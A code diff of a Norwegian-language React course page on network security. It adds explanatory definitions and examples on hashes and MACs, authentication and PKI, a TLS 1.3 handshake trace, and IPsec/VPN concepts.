+              body: "MD5 har vært brutt for kollisjoner siden 2004; SHA-1 siden 2017 (SHAttered-angrepet). Bruk dem aldri for sikkerhet (signering, sertifikater). De brukes fortsatt som ikke-krypto-checksums for rask integritets-sjekk i ikke-fiendtlig kontekst (git-objekter, men git migrerer også).",
+            },
+            {
+              term: "Lengde-extension-angrep",
+              body: "På Merkle-Damgård-hashes (MD5, SHA-1, SHA-2) kan en angriper som har sett h(secret ‖ m) regne ut h(secret ‖ m ‖ padding ‖ m') uten å kjenne secret. Derfor må man ALDRI bygge en MAC som bare hash(secret ‖ m). HMAC er den korrekte konstruksjonen som unngår dette.",
+            },
+            {
+              term: "Digital signering: RSA-PSS vs ECDSA vs EdDSA",
+              body: "RSA-PSS er moderne RSA-signering med tilfeldig padding. ECDSA bruker elliptiske kurver — kortere signaturer, men krever god randomness per signering (en gjenbrukt nonce kan lekke privat nøkkel; PlayStation 3 ble hacket sånn). EdDSA (Ed25519) er deterministisk og uten det fotfellet — mest robuste valg i dag.",
+            },
+            {
+              term: "Hvorfor MAC-then-encrypt vs encrypt-then-MAC vs AEAD",
+              body: "Encrypt-then-MAC er beviselig riktig: krypter først, så lag MAC over ciphertext. MAC-then-encrypt (SSL/TLS gjorde dette feil i flere år) skapte angrep som POODLE og Lucky-13. AEAD-modi (GCM, ChaCha20-Poly1305) gjør begge i ett og lukker hele klassen av disse feilene.",
+            },
+            {
+              term: "Tids-stempel og monotonisk teller",
+              body: "Alternativ til nonce mot replay. Mottaker avviser meldinger eldre enn N sekunder, eller med teller mindre enn forrige. Krever klokkesynkronisering eller persistent tilstand. Brukes f.eks. i Kerberos-billetter og JWT-er med exp-felt.",
+            },
+          ]}
+        />
         <Illustration caption="Hash mapper vilkårlig input til et kort fingeravtrykk. Selv én flippet bit i input endrer hele hashen.">
-        <HashSvg />
-      </Illustration>
+          <HashSvg />
+        </Illustration>
       </div>
+
+      <Hvorfor title="Hvorfor er kollisjons-resistens en lavere bar enn preimage-resistens?">
+        <p>
+          For en n-bits hash er brute-force på preimage (gitt en hash y, finn m) i størrelsesorden
+          2^n — du må prøve halvparten av input-rommet før forventet treff. Men for kollisjoner
+          (finn et par (m1, m2) med samme hash) er angriperens jobb mye lettere på grunn av{" "}
+          <em>fødselsdag-paradokset</em>: i et rom med 23 personer er det 50 % sjanse for at to
+          deler bursdag, ikke 50 % sjanse for at noen deler din bursdag.
+        </p>
+        <p>
+          Generaliseringen sier at i en uniform fordeling over 2^n verdier vil du forvente en
+          kollisjon etter ca. 2^(n/2) tilfeldige forsøk. Derfor er en 128-bits hash bare ekvivalent
+          med 64-bits sikkerhet mot kollisjon — praktisk å brute-force i dag. Det er hvorfor SHA-256
+          brukes der man trenger 128-bits kollisjons-sikkerhet (signering), mens SHA-128 aldri
+          eksisterte som standard.
+        </p>
+      </Hvorfor>
 
       <Illustration caption="HMAC tar inn både meldingen og en delt nøkkel — uten nøkkelen kan ikke Trudy lage gyldig tag.">
         <HmacSvg />
@@ -454,45 +655,98 @@ function Section84() {
 
       <div className="grid gap-3 lg:grid-cols-2">
         <Defs
-        items={[
-          {
-            term: "Forsøk 1: «Det er meg, Alice»",
-            body: "Alice sender bare en tekst. Trudy kan trivielt sende samme tekst — ingen bevis. Mislykket.",
-          },
-          {
-            term: "Forsøk 2: passord",
-            body: "Alice sender navn og passord. Hvis lenken er ukryptert kan Trudy snappe opp passordet og spille det av selv. Mislykket mot en passiv tjuvlytter.",
-          },
-          {
-            term: "Nonce",
-            body: "Et tilfeldig tall (nummer used once) som bare brukes i én sesjon. Mottakeren sender en nonce og krever at avsender beviser at hun ser den ved å gjøre noe med den — typisk ved å kryptere eller signere den. Forhindrer replay-angrep fordi gamle svar ikke matcher den nye nonce-en.",
-          },
-          {
-            term: "Challenge-response",
-            body: "Mønster der Bob sender en utfordring (typisk en nonce), og Alice svarer med en funksjon av utfordringen og en hemmelighet bare hun har. Hvis hemmeligheten er en delt symmetrisk nøkkel: svaret er MAC(K, nonce). Hvis det er Alices private nøkkel: svaret er sign(privA, nonce).",
-          },
-          {
-            term: "Man-in-the-middle",
-            body: "Trudy plasserer seg mellom Alice og Bob. Hun kjører to parallelle handshakes — én med hver. Begge tror de snakker med den andre, men alt går gjennom Trudy. Forsvares ved at en av partene har et forhåndsetablert anker (sertifikat eller forhåndsdelt nøkkel) som binder identitet til offentlig nøkkel.",
-          },
-          {
-            term: "Digitalt sertifikat",
-            body: "En signert binding av (identitet, offentlig nøkkel). Utstedes av en betrodd Certificate Authority (CA). Bob ser et sertifikat som sier «Alice sin offentlige nøkkel er pubA», signert av CA-en han allerede stoler på. Han trenger ikke ha møtt Alice — han trenger bare å stole på CA-en.",
-          },
-          {
-            term: "PKI (Public Key Infrastructure)",
-            body: "Hele systemet av CA-er, sertifikater, revoke-lister, og rot-nøkler som er bygd inn i operativsystem og nettlesere. Når du går til vg.no leveres et sertifikat utstedt av en CA hvis rot-sertifikat allerede er i Chromes trust store fra fabrikken. Tillit er transitiv: jeg stoler på CA, CA stoler på vg.no.",
-          },
-          {
-            term: "Revoke og OCSP",
-            body: "Hvis en privat nøkkel kompromitteres må sertifikatet trekkes tilbake før det utløper. CRL-er (lange ja/nei-lister) og OCSP (online sjekk per sertifikat) er to mekanismer for dette. I praksis bruker moderne nettlesere OCSP-stapling — serveren leverer selv et nylig OCSP-svar sammen med sertifikatet.",
-          },
-        ]}
-      />
+          items={[
+            {
+              term: "Forsøk 1: «Det er meg, Alice»",
+              body: "Alice sender bare en tekst. Trudy kan trivielt sende samme tekst — ingen bevis. Mislykket.",
+            },
+            {
+              term: "Forsøk 2: passord",
+              body: "Alice sender navn og passord. Hvis lenken er ukryptert kan Trudy snappe opp passordet og spille det av selv. Mislykket mot en passiv tjuvlytter.",
+            },
+            {
+              term: "Nonce",
+              body: "Et tilfeldig tall (nummer used once) som bare brukes i én sesjon. Mottakeren sender en nonce og krever at avsender beviser at hun ser den ved å gjøre noe med den — typisk ved å kryptere eller signere den. Forhindrer replay-angrep fordi gamle svar ikke matcher den nye nonce-en.",
+            },
+            {
+              term: "Challenge-response",
+              body: "Mønster der Bob sender en utfordring (typisk en nonce), og Alice svarer med en funksjon av utfordringen og en hemmelighet bare hun har. Hvis hemmeligheten er en delt symmetrisk nøkkel: svaret er MAC(K, nonce). Hvis det er Alices private nøkkel: svaret er sign(privA, nonce).",
+            },
+            {
+              term: "Man-in-the-middle",
+              body: "Trudy plasserer seg mellom Alice og Bob. Hun kjører to parallelle handshakes — én med hver. Begge tror de snakker med den andre, men alt går gjennom Trudy. Forsvares ved at en av partene har et forhåndsetablert anker (sertifikat eller forhåndsdelt nøkkel) som binder identitet til offentlig nøkkel.",
+            },
+            {
+              term: "Digitalt sertifikat",
+              body: "En signert binding av (identitet, offentlig nøkkel). Utstedes av en betrodd Certificate Authority (CA). Bob ser et sertifikat som sier «Alice sin offentlige nøkkel er pubA», signert av CA-en han allerede stoler på. Han trenger ikke ha møtt Alice — han trenger bare å stole på CA-en.",
+            },
+            {
+              term: "PKI (Public Key Infrastructure)",
+              body: "Hele systemet av CA-er, sertifikater, revoke-lister, og rot-nøkler som er bygd inn i operativsystem og nettlesere. Når du går til vg.no leveres et sertifikat utstedt av en CA hvis rot-sertifikat allerede er i Chromes trust store fra fabrikken. Tillit er transitiv: jeg stoler på CA, CA stoler på vg.no.",
+            },
+            {
+              term: "Revoke og OCSP",
+              body: "Hvis en privat nøkkel kompromitteres må sertifikatet trekkes tilbake før det utløper. CRL-er (lange ja/nei-lister) og OCSP (online sjekk per sertifikat) er to mekanismer for dette. I praksis bruker moderne nettlesere OCSP-stapling — serveren leverer selv et nylig OCSP-svar sammen med sertifikatet.",
+            },
+            {
+              term: "X.509-sertifikat-felter",
+              body: "Standard-felter: Subject (hvem sertifikatet hører til, f.eks. CN=vg.no), Issuer (CA-en som signerte), Validity (NotBefore/NotAfter), Public Key (algoritme + nøkkelmateriale), Serial Number (unikt per CA), Signature Algorithm, og en stor blokk Extensions. SAN (Subject Alternative Names) er der ekte domener for HTTPS legges i dag — CN brukes ikke lenger til validering.",
+            },
+            {
+              term: "Sertifikat-utvidelser (Extensions)",
+              body: "Bærer den meste av semantikken i moderne X.509: KeyUsage (signering / kryptering / nøkkel-utveksling), ExtendedKeyUsage (server-auth, klient-auth, code-signing), BasicConstraints (CA: true/false), CRLDistributionPoints, AuthorityInfoAccess (peker til OCSP). En misforstått KeyUsage er klassisk feilkonfigurasjon.",
+            },
+            {
+              term: "Domain Validation (DV) vs Organization (OV) vs Extended (EV)",
+              body: "DV: CA verifiserer bare at søker kontrollerer domenet (typisk ACME-challenge med Let's Encrypt). OV: CA verifiserer også organisasjonens identitet manuelt. EV: enda strengere prosess. Nettlesere viser ikke lenger EV-bannere; for vanlige brukere er forskjellen i praksis blitt usynlig.",
+            },
+            {
+              term: "Sertifikat-piping og chain-of-trust",
+              body: "En server sender ikke bare sitt eget sertifikat men også de mellomliggende CA-ene helt opp til (men ikke inkludert) en rot CA som klienten har lokalt. Klienten verifiserer hver signatur i kjeden. Feiler om et mellomledd mangler — vanlig konfigurasjons-feil.",
+            },
+            {
+              term: "CRL (Certificate Revocation List)",
+              body: "Stor liste utstedt av CA som inneholder serienumrene til alle tilbaketrukne sertifikater i dens domene. Lastes ned periodisk av klienter. Skalerer dårlig (kan bli mange MB) og er ofte utdatert. Erstattes gradvis av OCSP og kortere-levetid-sertifikater.",
+            },
+            {
+              term: "OCSP-stapling og MustStaple",
+              body: "OCSP-stapling lar server selv hente et signert OCSP-svar fra CA og levere det sammen med sertifikatet i TLS-handshake. Sparer klient en runde til CA. MustStaple-utvidelsen i sertifikatet sier: «hvis serveren ikke leverer stapled OCSP, ikke stol på den» — gir mye sterkere revoke-garantier.",
+            },
+            {
+              term: "Certificate Transparency (CT)",
+              body: "Offentlige, append-only-logger der alle nyutstedte sertifikater må publiseres. Hvis en CA utsteder et falskt sertifikat for vg.no, vil VG kunne oppdage det ved å overvåke CT-logger. Moderne nettlesere krever at sertifikater er i minst to CT-logger.",
+            },
+            {
+              term: "Mutual TLS (mTLS)",
+              body: "Begge parter presenterer sertifikat — ikke bare serveren. Brukes i service-mesh (Istio, Linkerd) og mellom interne tjenester. Klient-sertifikatet bærer både identitet og autorisasjon. Mye sterkere enn passord/API-nøkler fordi privat nøkkel aldri sendes.",
+            },
+            {
+              term: "Multi-factor authentication (MFA)",
+              body: "Bevis bestående av minst to av: noe du vet (passord), noe du har (telefon med TOTP / sikkerhetsnøkkel), noe du er (biometri). SMS-koder regnes som svak MFA pga. SIM-swap; TOTP (Google Authenticator) er bedre; FIDO2/WebAuthn med hardware-nøkkel er sterkest.",
+            },
+          ]}
+        />
         <Illustration caption="Challenge-response med signatur. Bob velger en fersk nonce; Alice beviser identitet ved å signere den.">
-        <ChallengeResponseSvg />
-      </Illustration>
+          <ChallengeResponseSvg />
+        </Illustration>
       </div>
+
+      <Hvorfor title="Hvorfor må nonce være tilfeldig og ikke bare øke monotont?">
+        <p>
+          En teller (1, 2, 3, ...) ville stoppet replay-angrep der angriper sender samme melding to
+          ganger, men ikke <em>refleksjons-angrep</em>. Anta Alice og Bob bruker delt nøkkel og en
+          teller. Trudy åpner to parallelle sesjoner mot Bob, samtidig som «klient» og «server», og
+          krysser meldingene: når Bob ber om challenge i den ene sesjonen, sender Trudy den videre
+          som sin egen challenge i den andre. Bob ender opp med å svare på sin egen utfordring og
+          tror Trudy er Alice.
+        </p>
+        <p>
+          En tilfeldig nonce (128+ bit fra kryptografisk PRNG) gjør dette praktisk umulig — sjansen
+          for at to parallelle sesjoner får samme nonce er forsvinnende liten, og en angriper kan
+          ikke forutsi neste verdi for å sette opp angrepet. Derfor sier TLS-spesifikasjonen
+          eksplisitt at både client_random og server_random skal være 32 byte fra en CSPRNG.
+        </p>
+      </Hvorfor>
 
       <Illustration caption="Tillits-kjede: rot-CA → mellom-CA → server-sertifikat. Nettleseren har rot-CA i trust store fra fabrikken.">
         <PkiSvg />
@@ -533,41 +787,96 @@ function Section85() {
 
       <div className="grid gap-3 lg:grid-cols-2">
         <Defs
-        items={[
-          {
-            term: "TLS-record",
-            body: "Etter handshake snakker partene i TLS-records: en liten header som angir type og lengde, så en kryptert+autentisert payload. Hver record er uavhengig kryptert, så en angriper kan ikke kutte ut eller flytte rundt records.",
-          },
-          {
-            term: "Handshake-faser",
-            body: "(1) Hilse — klient og server utveksler nonces og hva slags algoritmer de støtter. (2) Server-autentisering — server sender sertifikat. (3) Nøkkelutveksling — typisk ECDHE for forward secrecy. (4) Bekreftelse — begge sjekker at handshake-en ikke har blitt tuklet med, så starter de å sende kryptert data.",
-          },
-          {
-            term: "Cipher suite",
-            body: "Pakke av valgte algoritmer som forhandles frem i hilse-fasen. Eks: TLS_AES_128_GCM_SHA256 betyr AES-128 i GCM-modus og SHA-256 for HKDF. TLS 1.3 ryddet kraftig — det er nå et lite, sikkert sett av suites igjen.",
-          },
-          {
-            term: "Forward Secrecy (FS)",
-            body: "Egenskap der kompromittering av en server-nøkkel i ettertid ikke avslører gamle sesjoner. Oppnås ved at sesjons-nøkkelen avtales via en éphemeral DH (ECDHE) og kastes når sesjonen er over. TLS 1.3 dropper RSA-key-exchange nettopp fordi det ikke gir FS — server-nøkkel kompromittert = alle gamle sesjoner kan dekrypteres.",
-          },
-          {
-            term: "Master secret og avledede nøkler",
-            body: "DH-en gir et felles tilfeldig tall (pre-master). Det blandes med begge nonces gjennom HKDF og produserer mange separate nøkler — én for hver retning av trafikken og én for MAC. Hver retning har sin egen nøkkel og IV-teller, så replay og refleksjon ikke fungerer.",
-          },
-          {
-            term: "Session resumption",
-            body: "TLS-handshake koster en eller to RTT-er. For å unngå dette ved gjenoppkobling kan klienten ta vare på en sesjons-billett (session ticket) eller en PSK (pre-shared key). Neste gang sender den en short-circuit handshake basert på den, og 1-RTT (eller 0-RTT) er nok. Lagrer ofte bare 24 timer.",
-          },
-          {
-            term: "TLS 1.3 forenkling",
-            body: "Versjonen fjernet en haug arvet bagasje: ingen RSA-key-exchange, ingen statisk DH, ingen MAC-then-encrypt, ingen renforhandling. Bare AEAD-ciphers (GCM, ChaCha20-Poly1305). Handshake gikk fra 2-RTT til 1-RTT. Resultatet er enklere, raskere og tryggere.",
-          },
-        ]}
-      />
+          items={[
+            {
+              term: "TLS-record",
+              body: "Etter handshake snakker partene i TLS-records: en liten header som angir type og lengde, så en kryptert+autentisert payload. Hver record er uavhengig kryptert, så en angriper kan ikke kutte ut eller flytte rundt records.",
+            },
+            {
+              term: "Handshake-faser",
+              body: "(1) Hilse — klient og server utveksler nonces og hva slags algoritmer de støtter. (2) Server-autentisering — server sender sertifikat. (3) Nøkkelutveksling — typisk ECDHE for forward secrecy. (4) Bekreftelse — begge sjekker at handshake-en ikke har blitt tuklet med, så starter de å sende kryptert data.",
+            },
+            {
+              term: "Cipher suite",
+              body: "Pakke av valgte algoritmer som forhandles frem i hilse-fasen. Eks: TLS_AES_128_GCM_SHA256 betyr AES-128 i GCM-modus og SHA-256 for HKDF. TLS 1.3 ryddet kraftig — det er nå et lite, sikkert sett av suites igjen.",
+            },
+            {
+              term: "Forward Secrecy (FS)",
+              body: "Egenskap der kompromittering av en server-nøkkel i ettertid ikke avslører gamle sesjoner. Oppnås ved at sesjons-nøkkelen avtales via en éphemeral DH (ECDHE) og kastes når sesjonen er over. TLS 1.3 dropper RSA-key-exchange nettopp fordi det ikke gir FS — server-nøkkel kompromittert = alle gamle sesjoner kan dekrypteres.",
+            },
+            {
+              term: "Master secret og avledede nøkler",
+              body: "DH-en gir et felles tilfeldig tall (pre-master). Det blandes med begge nonces gjennom HKDF og produserer mange separate nøkler — én for hver retning av trafikken og én for MAC. Hver retning har sin egen nøkkel og IV-teller, så replay og refleksjon ikke fungerer.",
+            },
+            {
+              term: "Session resumption",
+              body: "TLS-handshake koster en eller to RTT-er. For å unngå dette ved gjenoppkobling kan klienten ta vare på en sesjons-billett (session ticket) eller en PSK (pre-shared key). Neste gang sender den en short-circuit handshake basert på den, og 1-RTT (eller 0-RTT) er nok. Lagrer ofte bare 24 timer.",
+            },
+            {
+              term: "TLS 1.3 forenkling",
+              body: "Versjonen fjernet en haug arvet bagasje: ingen RSA-key-exchange, ingen statisk DH, ingen MAC-then-encrypt, ingen renforhandling. Bare AEAD-ciphers (GCM, ChaCha20-Poly1305). Handshake gikk fra 2-RTT til 1-RTT. Resultatet er enklere, raskere og tryggere.",
+            },
+            {
+              term: "ClientHello og SNI (Server Name Indication)",
+              body: "Første pakke fra klient. Inneholder støttede versjoner, cipher suites, supported groups (kurver for DH), key shares, og kritisk: SNI — hvilket domene klienten vil snakke med. SNI gjør at én IP kan vertere mange HTTPS-domener fordi serveren ser navnet før den velger sertifikat. ECH (Encrypted Client Hello) krypterer også SNI.",
+            },
+            {
+              term: "ServerHello og cipher-valg",
+              body: "Server svarer med valgt versjon, cipher suite, sin DH-andel og sitt sertifikat. I TLS 1.3 er sertifikat-meldingen kryptert med handshake-nøkkel — angriper kan ikke se hvilket sertifikat serveren bruker.",
+            },
+            {
+              term: "Finished-melding",
+              body: "Siste handshake-melding fra hver side. Inneholder en MAC over hele handshake-transkripsjonen (alt som er sendt så langt) med en nøkkel avledet fra handshake. Hvis en angriper har manipulert et tidligere felt (downgrade-angrep), matcher ikke MAC-en og handshake feiler.",
+            },
+            {
+              term: "0-RTT (Zero Round-Trip Time)",
+              body: "TLS 1.3-tillegg: klient som har en gyldig PSK fra tidligere sesjon kan sende kryptert applikasjons-data sammen med ClientHello, før server har svart. Sparer en RTT. Pris: 0-RTT-data har ikke forward secrecy mot den ene PSK-en, og er sårbar for replay — derfor kun for idempotente operasjoner.",
+            },
+            {
+              term: "HKDF og nøkkel-avledning",
+              body: "TLS 1.3 bruker HKDF (HMAC-based Key Derivation Function) til å avlede et helt tre av nøkler fra DH-shared-secret + handshake-transkript: handshake_traffic_secret, application_traffic_secret, exporter_secret, resumption_master_secret. Hver tjener et eget formål og er bundet til transkriptet.",
+            },
+            {
+              term: "Downgrade-angrep og TLS_FALLBACK_SCSV",
+              body: "Angriper avbryter TLS-handshake og lurer klienten til å prøve igjen med eldre, svakere versjon (TLS 1.0 / SSL 3.0). POODLE-angrepet utnyttet dette. Forsvar: TLS_FALLBACK_SCSV signaliserer at klienten har fallback-et, og serveren avviser hvis den støtter høyere versjon.",
+            },
+            {
+              term: "QUIC og TLS 1.3",
+              body: "QUIC (under HTTP/3) integrerer TLS 1.3 direkte i transport-laget over UDP. Handshake skjer parallelt med transport-oppsett, så 1-RTT etablerer både transport og kryptering. Forhindrer hele klasser av middlebox-interferens fordi UDP-payload er helt kryptert.",
+            },
+            {
+              term: "Cipher suite-notasjon i TLS 1.3 vs 1.2",
+              body: "TLS 1.2: TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (key-exchange + auth + cipher + MAC, alt i navnet). TLS 1.3: kun TLS_AES_128_GCM_SHA256 — key-exchange og signatur forhandles separat via supported_groups og signature_algorithms-utvidelser. Mye renere.",
+            },
+            {
+              term: "ALPN (Application-Layer Protocol Negotiation)",
+              body: "TLS-utvidelse der klient og server forhandler applikasjons-protokoll under handshake (h2 for HTTP/2, http/1.1 for klassisk, h3 for QUIC). Sparer en ekstra runde og lar én port kjøre flere protokoller. Brukes også av WebSocket-oppgradering og gRPC.",
+            },
+          ]}
+        />
         <Illustration caption="TLS 1.3 handshake — én RTT før applikasjons-data kan sendes. ServerHello inneholder sertifikat og DH-andel.">
-        <TlsHandshakeSvg />
-      </Illustration>
+          <TlsHandshakeSvg />
+        </Illustration>
       </div>
+
+      <Hvorfor title="Hvorfor dropper TLS 1.3 RSA-key-exchange?">
+        <p>
+          I gammel RSA-key-exchange genererte klienten et pre-master secret og krypterte det med
+          serverens offentlige RSA-nøkkel. Server dekrypterte med sin private nøkkel. Det fungerer —
+          men gir <em>ingen forward secrecy</em>: hele sesjonens sikkerhet avhenger av at serverens
+          langlivede private nøkkel aldri lekker. En angriper som logger ciphertext-trafikk i fem år
+          og deretter — via et innbrudd, en hjemmel, en utpressing — får tak i den private nøkkelen,
+          kan dekryptere alle de fem årene med kommunikasjon.
+        </p>
+        <p>
+          (EC)DHE løser dette ved at hver part lager et ferskt, kortlivd DH-nøkkelpar bare for den
+          ene handshaken. Det delte hemmeligheten utledes av disse éphemeral-nøklene, og de blir
+          slettet umiddelbart etterpå. Serverens langlivede nøkkel brukes bare til å signere
+          DH-andel (autentisering), ikke til selve nøkkelutvekslingen. Lekkasje i ettertid lar
+          angriper falske fremtidige handshakes, men gamle sesjoner forblir trygge. TLS 1.3 gjør
+          derfor (EC)DHE obligatorisk og fjerner RSA-key-exchange helt.
+        </p>
+      </Hvorfor>
 
       <Example title="Eksempel: regn ut hva som er trygt etter at server-nøkkelen lekker">
         <p>
@@ -592,6 +901,48 @@ function Section85() {
         </p>
       </Example>
 
+      <Example title="Eksempel: TLS 1.3 handshake-trace, melding for melding">
+        <p>
+          La oss følge en typisk handshake mellom en nettleser og banken
+          <code> sparebank.example.no</code>:
+        </p>
+        <pre className="mt-2 rounded bg-muted/30 p-2 font-mono text-[11px] overflow-x-auto">
+          {`Klient ─────────────────────────────────────────────── Server
+   ClientHello {
+     versions:   [TLS 1.3, TLS 1.2]
+     cipher_suites: [TLS_AES_128_GCM_SHA256, ...]
+     supported_groups: [x25519, secp256r1]
+     key_share:   x25519 = (klient_pub)
+     SNI:         sparebank.example.no
+     client_random: 32 bytes (CSPRNG)
+   }                                       ────────────►
+
+                                           ◄────────────  ServerHello {
+                                              version:    TLS 1.3
+                                              cipher:     TLS_AES_128_GCM_SHA256
+                                              key_share:  x25519 = (server_pub)
+                                              server_random: 32 bytes
+                                           }
+                                           ── { handshake_secret avledes på begge sider } ──
+                                                          {Certificate, sertifikat-kjede}
+                                                          {CertificateVerify, signatur over transkript}
+                                                          {Finished, MAC over transkript}
+   {verifiserer sertifikat-kjede}
+   {verifiserer CertificateVerify mot pubkey i sertifikatet}
+   {verifiserer Finished-MAC}
+   {Finished, MAC over transkript}        ────────────►
+
+   ── { application_traffic_secret avledes; tunnel åpen } ──
+   {GET / HTTP/1.1, Host: sparebank.example.no}  ───────►
+                                           ◄────────────  {HTTP/1.1 200 OK, ...}`}
+        </pre>
+        <p className="mt-2 text-muted-foreground">
+          Merk at sertifikatet sendes ETTER ServerHello og er kryptert med handshake_traffic_secret
+          — det betyr at en passiv observatør ikke ser hvilken server klienten autentiserer. Bare
+          SNI (i ClientHello) avslører servernavnet, og ECH gjør også det skjult.
+        </p>
+      </Example>
+
       <RelatedSlugs slugs={["tls", "dte2507-tls-handshake", "dte2507-tls-handshake-lab"]} />
     </article>
   );
@@ -613,41 +964,95 @@ function Section86() {
 
       <div className="grid gap-3 lg:grid-cols-2">
         <Defs
-        items={[
-          {
-            term: "AH (Authentication Header)",
-            body: "IPsec-protokoll som gir integritet og autentisering, men IKKE konfidensialitet. AH-headeren inneholder en HMAC over hele pakken inkludert (de fleste) IP-felter. Brukes sjelden alene i dag — folk vil nesten alltid også ha kryptering.",
-          },
-          {
-            term: "ESP (Encapsulating Security Payload)",
-            body: "IPsec-protokoll som gir konfidensialitet pluss integritet. Payload krypteres (typisk AES-CBC eller AES-GCM), og en MAC dekker den krypterte payload-en. ESP er det vanlige valget i moderne deployments.",
-          },
-          {
-            term: "Transport-mode",
-            body: "Den originale IP-headeren beholdes; bare payload-en (TCP/UDP-data) krypteres og legges innenfor en ESP-konvolutt. Brukes mellom to enkelt-hosts som vil snakke trygt direkte. Sparer plass siden det ikke trengs ekstra IP-header.",
-          },
-          {
-            term: "Tunnel-mode",
-            body: "Hele den originale IP-pakken krypteres og pakkes inn som payload i en helt ny IP-pakke med ny header. Vanlig mellom to VPN-gateways: kontoret i Tromsø og kontoret i Bergen har én tunnel; alle pakker fra Tromsø-LAN-et pakkes inn, sendes over internett kryptert, og pakkes ut i Bergen.",
-          },
-          {
-            term: "SA (Security Association)",
-            body: "Enveis avtale mellom to noder om en spesifikk sikkerhetsprofil: hvilken protokoll (AH/ESP), modus, krypterings- og autentiserings-nøkler, og en SPI (Security Parameters Index) som identifiserer SA-en. To-veis kommunikasjon krever to SA-er, én i hver retning.",
-          },
-          {
-            term: "IKE (Internet Key Exchange)",
-            body: "Protokollen som forhandler frem SA-er og avtaler nøkler. Versjon 2 er standard i dag. Bruker DH for nøkkelutveksling, sertifikater eller PSK for autentisering. Resultatet er at begge sider har samme symmetriske nøkler uten at de noen gang er sendt åpent.",
-          },
-          {
-            term: "Anti-replay-vindu",
-            body: "Hver pakke i en SA har et 32-bits sekvensnummer. Mottaker holder et glidende vindu (typisk 64 pakker) og avviser pakker som er for gamle eller allerede sett. Stopper en angriper fra å samle gamle pakker og spille dem av senere.",
-          },
-        ]}
-      />
+          items={[
+            {
+              term: "AH (Authentication Header)",
+              body: "IPsec-protokoll som gir integritet og autentisering, men IKKE konfidensialitet. AH-headeren inneholder en HMAC over hele pakken inkludert (de fleste) IP-felter. Brukes sjelden alene i dag — folk vil nesten alltid også ha kryptering.",
+            },
+            {
+              term: "ESP (Encapsulating Security Payload)",
+              body: "IPsec-protokoll som gir konfidensialitet pluss integritet. Payload krypteres (typisk AES-CBC eller AES-GCM), og en MAC dekker den krypterte payload-en. ESP er det vanlige valget i moderne deployments.",
+            },
+            {
+              term: "Transport-mode",
+              body: "Den originale IP-headeren beholdes; bare payload-en (TCP/UDP-data) krypteres og legges innenfor en ESP-konvolutt. Brukes mellom to enkelt-hosts som vil snakke trygt direkte. Sparer plass siden det ikke trengs ekstra IP-header.",
+            },
+            {
+              term: "Tunnel-mode",
+              body: "Hele den originale IP-pakken krypteres og pakkes inn som payload i en helt ny IP-pakke med ny header. Vanlig mellom to VPN-gateways: kontoret i Tromsø og kontoret i Bergen har én tunnel; alle pakker fra Tromsø-LAN-et pakkes inn, sendes over internett kryptert, og pakkes ut i Bergen.",
+            },
+            {
+              term: "SA (Security Association)",
+              body: "Enveis avtale mellom to noder om en spesifikk sikkerhetsprofil: hvilken protokoll (AH/ESP), modus, krypterings- og autentiserings-nøkler, og en SPI (Security Parameters Index) som identifiserer SA-en. To-veis kommunikasjon krever to SA-er, én i hver retning.",
+            },
+            {
+              term: "IKE (Internet Key Exchange)",
+              body: "Protokollen som forhandler frem SA-er og avtaler nøkler. Versjon 2 er standard i dag. Bruker DH for nøkkelutveksling, sertifikater eller PSK for autentisering. Resultatet er at begge sider har samme symmetriske nøkler uten at de noen gang er sendt åpent.",
+            },
+            {
+              term: "Anti-replay-vindu",
+              body: "Hver pakke i en SA har et 32-bits sekvensnummer. Mottaker holder et glidende vindu (typisk 64 pakker) og avviser pakker som er for gamle eller allerede sett. Stopper en angriper fra å samle gamle pakker og spille dem av senere.",
+            },
+            {
+              term: "SPI (Security Parameters Index)",
+              body: "32-bits identifikator i ESP/AH-headeren. Mottaker bruker (dst-IP, SPI, protokoll) som nøkkel til å slå opp riktig SA i sin SAD (Security Association Database) og dermed riktige krypto-nøkler. Velges av mottaker når SA opprettes via IKE.",
+            },
+            {
+              term: "SAD og SPD",
+              body: "SAD (Security Association Database): tabell over aktive SA-er — én rad per retning, indeksert på SPI. SPD (Security Policy Database): regel-tabell som sier hvilken trafikk som skal beskyttes (protect), slippes gjennom klart (bypass), eller forkastes (discard). SPD-en konfigureres av admin; SAD-en fylles ut av IKE.",
+            },
+            {
+              term: "IKEv2-faser",
+              body: "Fase 1 (IKE_SA_INIT): forhandler IKE-SA selv — DH-utveksling + algoritmer, åpner en sikker kanal for resten av IKE. Fase 2 (IKE_AUTH): autentiserer parter (sertifikat eller PSK) og oppretter første barne-SA for trafikk. CREATE_CHILD_SA-utvekslinger oppretter senere SA-er eller roterer nøkler.",
+            },
+            {
+              term: "PFS (Perfect Forward Secrecy) i IPsec",
+              body: "Hver ny barne-SA gjør sin egen ferske DH-utveksling i stedet for å avlede nøkler fra IKE-SA-ens master. Hvis IKE-master-nøkkelen lekker, er fortsatt eldre barne-SA-trafikk trygg. Anbefales på i moderne deployments.",
+            },
+            {
+              term: "NAT-traversal (NAT-T) og UDP-encapsulation",
+              body: "ESP er protokoll 50 — NAT-bokser klarer ikke å rute den fordi det ikke er TCP/UDP-porter å spore. Løsningen er å pakke ESP inn i UDP port 4500. IKEv2 detekterer NAT under handshake via NAT_DETECTION-payloads og bytter automatisk til UDP-encapsulation.",
+            },
+            {
+              term: "WireGuard som moderne alternativ",
+              body: "Ny VPN-protokoll som droppet IPsec-kompleksiteten. Bare én cipher suite (ChaCha20-Poly1305 + Curve25519 + BLAKE2s + SipHash), fast 4-byte header, ingen forhandling. ~4000 linjer kode mot IPsec sine ~400 000. Kjøres i kjernen, ekstremt rask, og enkel å auditere.",
+            },
+            {
+              term: "Site-to-site vs remote-access VPN",
+              body: "Site-to-site: tunnel mellom to faste gateways (kontorer). Remote-access: en bruker med klient-programvare kobler seg til en VPN-konsentrator (hjemmekontor). De bruker samme underliggende protokoller (IPsec, OpenVPN, WireGuard) men med ulik klient-tilstand.",
+            },
+            {
+              term: "Split-tunneling vs full-tunneling",
+              body: "Full-tunneling: ALL trafikk fra klienten går gjennom VPN. Sikkert men treigt og overdrevet for vanlig web-surf. Split-tunneling: bare trafikk til bedriftsadresser går i tunnelen, resten direkte. Bedre ytelse, men eksponerer klient-maskinen for hjemmenettet hvis det er kompromittert.",
+            },
+            {
+              term: "Hva IPsec ikke gir",
+              body: "Tilgang til applikasjons-laget (kan ikke filtrere på HTTP-URL eller blokkere XSS), ingen bruker-til-bruker-autentisering (bare endepunkt-til-endepunkt), og ingen forsvar mot insider på samme LAN som har tilgang til den dekrypterte enden. IPsec er transport-sikkerhet, ikke et helhetlig forsvar.",
+            },
